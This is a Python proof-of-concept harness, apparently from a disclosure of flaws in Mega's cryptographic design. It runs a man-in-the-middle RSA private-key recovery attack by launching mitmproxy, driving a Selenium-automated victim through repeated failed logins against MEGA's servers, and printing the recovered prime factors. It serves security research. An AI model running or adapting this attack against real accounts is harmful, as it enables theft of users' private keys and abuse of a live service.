
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC for MitM RSA Key Recovery attack using mitmproxy and a victim
# automated with a Selenium browser.
#

from time import sleep

from shared.constants.victim import *
from shared.constants.mitmproxy import *
from shared.victim import *
from shared.mitmproxy import *

class PoCMitmRsaKeyRecovery:
    def __init__(self):
        print("# Initialize MITM RSA key recovery PoC")

    def run_attack(self):
        print("## Starting mitm attack")

        print("ATTENTION: This attack will cause up to 1023 login requests on"
              " MEGA's servers.")
        ans = input("Are you sure you want to run it? [y/n] ")
        if ans.lower() != "y":
            return

        print("### Starting mitmproxy")
        mitmproxy = Mitmproxy("issue_01/poc_mitmproxy.py")
        mitmproxy.start()

        print("### Starting the victim process")
        victim = Victim(VICTIM_UNAME)
        victim.loop_unsuccessful_logins_detached()

        print(f"### The attack is running, check '{MITMPROXY_LOG_FILE}' for intermediate results.")

        while True:
            mitmproxy.assure_is_alive()
            if mitmproxy.was_restarted():
                print("Unexpectedly restarted script, aborting")
                break

            victim.assure_is_alive()

            if mitmproxy.is_done():
                print("### Attack successful!")
                print(mitmproxy.get_factors())
                break

            sleep(1)

        mitmproxy.exit()
        victim.exit()
